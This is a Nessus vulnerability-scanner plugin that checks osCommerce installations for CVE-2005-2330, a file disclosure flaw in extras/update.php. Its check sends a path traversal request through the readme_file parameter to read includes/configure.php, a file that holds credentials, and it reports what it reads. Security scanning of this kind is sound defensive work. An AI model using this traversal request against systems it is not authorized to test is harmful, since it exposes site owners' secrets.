#
# (C) Tenable Network Security
#
# additional directores added by SECNAP Network Security
# based on google search inurl:"extras/update.php" intext:mysql.php -display
# also, changing 'string' to return, since some sites can block ../


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
file disclosure vulnerability.

Description :

The remote host is running osCommerce, an open-source e-commerce
system. 

The osCommerce installation on the remote host has a supplementary
script, 'extras/update.php', that fails to validate user-supplied
input to the 'readme_file' parameter before using that to display a
file.  An attacker can exploit this flaw to read arbitrary files on
the remote host, such as the '.htaccess' file used to protect the
admin directory. 

See also : 

http://www.oscommerce.com/community/bugs,2835

Solution : 

Remove the 'extras/update.php' script.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";


if (description)
{
  script_id(19256);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2330");
  script_bugtraq_id(14294);

  script_name(english:"osCommerce readme_file Parameter File Disclosure Vulnerability");
  script_summary(english:"Tries to read a file with osCommerce");
 
  script_description(english:desc);
 

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Search for osCommerce.
if (thorough_tests) dirs = make_list("/oscommerce", "/oscommerce-2.2ms2", "/shop", "/catalog", "/ms2", "/store", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  req = http_get(
    item:string(
      dir, "/extras/update.php?",
      # Grab osCommerce's configuration file.
      "readme_file=../includes/configure.php"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like osCommerce's configuration file.
  if (egrep(string:res, pattern:"define\('(DIR_WS_HTTP_CATALOG|DIR_WS_IMAGES|DIR_WS_INCLUDES)"))
  {
    contents = strstr(res, "<TD>");
    if (contents) contents = contents - "<TD>";
    if (contents) contents = contents - strstr(contents, "<HR NOSHADE");

    if (isnull(contents)) report = desc;
    else
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file 'includes/configure.php' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
  # could not find config file, but still has update.php exposed 
  else if ("read_me=1" >< res) {
    security_warning(port);
    exit(0);
  }
}
